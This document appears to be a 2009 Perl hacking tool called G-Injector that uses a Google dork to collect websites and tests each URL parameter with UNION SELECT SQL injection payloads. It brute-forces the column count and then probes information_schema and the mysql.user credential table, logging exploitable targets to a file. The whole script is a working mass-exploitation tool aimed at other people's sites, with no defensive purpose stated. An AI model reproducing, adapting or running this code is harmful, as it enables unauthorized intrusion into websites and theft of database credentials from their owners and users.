#!/usr/bin/perl 
# http://rk-project.tk 
# bsnseabra@hotmail.com 
# zer0xProud © greetz to Gladiator 
# Sábado, 10 de Janeiro de 2009 
use LWP::UserAgent; 
my $top = LWP::UserAgent->new(); 
$top->timeout(10); 
$top->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201 Firefox/3.0"); 
unless($ARGV[2]) { 
   print "=> G-Injector <=\n"; 
   print "=> Use: ginjector.pl \"dork\" limit sqltest.txt\n"; 
   print "=> Visit Us unkn0wn.ws! <=\n"; 
exit 0; 
} 
open(WEBSITES, ">>", $ARGV[2])or die("File No Exists\n"); 
chomp($ARGV[0]); 
syswrite STDOUT, "=><=>=<=>=<=>=<=>=<=\n"; 
syswrite STDOUT, "=> G-Injector 1.0 <=\n"; 
syswrite STDOUT, "=><=>=<=>=<=>=<=>=<=\n"; 
googler($ARGV[0],$ARGV[2]); 
close(WEBSITES); 
fin(); 
sub inject{ 
	syswrite STDOUT, "=> Verifing.. $_[0]=\n"; 
	syswrite STDOUT, "=> Vulnerable??: "; 
	my $weborig = $_[0] . "="; 
	my $injhex = "-1+union+select+0x6c333374"; 
	my $injnum = "-1+union+select+0"; 
	my $hex='0x6c333374'; 
	my $sw = 0; 
	$webnum=$weborig . $injnum; 
	$webhex=$weborig . $injhex; 
	for($conta=0;$conta<=$ARGV[1];$conta++){ 
		if($conta>0){ 
			$webhex.=','.$hex; 
			$webnum.=','.$conta; 
		} 
		$codeweb = $top->get($webhex . "--"); 
		if($codeweb->is_success){ 
			$getcodeweb = $codeweb->content; 
			if($getcodeweb =~ /l33t/ ){ 
				syswrite STDOUT, "Ya!\n"; 
				$sw = 1; 
				$conta = $_[1] + 1; 
				print WEBSITES "$webnum--\n"; 
				schemauser($webhex,$webnum); 
			} 
		} 
	} 
	if($sw == 0){ 
		syswrite STDOUT, "n0p!\n"; 
	} 
} 
sub fin{ 
	print "\n Ok, Scan Finished, Thanks, Visit us unkn0wn.ws\n"; 
} 
sub schemauser{ 
	my $schinj = "+from+information_schema.tables--"; 
	my $userinj = "+from+mysql.user--"; 
	syswrite STDOUT, "=> Information Schema?: "; 
	my $ws = $_[0] . $schinj; 
	my $wwss = $_[1] . $schinj; 
	my $webschema = $top->get($ws); 
	if($webschema->is_success){ 
		$getwebschema = $webschema->content; 
		if($getwebschema =~ /l33t/ ){ 
			syswrite STDOUT, "Ya!\n"; 
			print WEBSITES "$wwss\n"; 
		}else{ 
			syswrite STDOUT, "n0p!\n"; 
		} 
	} 
	syswrite STDOUT, "=> mysql.User??: "; 
	my $wu = $_[0] . $userinj; 
	my $wwuu = $_[1] . $userinj; 
	my $webuser = $top->get($wu); 
	if($webuser->is_success){ 
		$getwebuser = $webuser->content; 
		if($webuser =~ /l33t/ ){ 
			syswrite STDOUT, "Ya!\n"; 
			print WEBSITES "$wwuu\n"; 
		}else{ 
			syswrite STDOUT, "n0p!\n"; 
		} 
	} 
} 
sub cleared{ 
	my $sha = $_[0]; 
	if($sha =~ /\=/ ){ 
		@splitweb=split("=",$sha); 
		inject($splitweb[0]); 
	} 
} 
sub googler{ 
	sleep(1); 
	syswrite STDOUT, "Wait Please....\n"; 
	for($numpag=0;$numpag<=40;$numpag=$numpag+10){ 
		my $find = 'http://www.google.com.ar/search?hl=es&q=' . $_[0] . '&start=' . $numpag . '&sa=N'; 
		my $resweb = $top->get($find); 
		if($resweb->is_success){ 
			$getwebs = $resweb->content; 
			while($getwebs =~ m/<h3 class\=r><a href\=\"(.*?)\" class\=/g ){ 
				cleared($1); 
			} 
		} 
	} 
}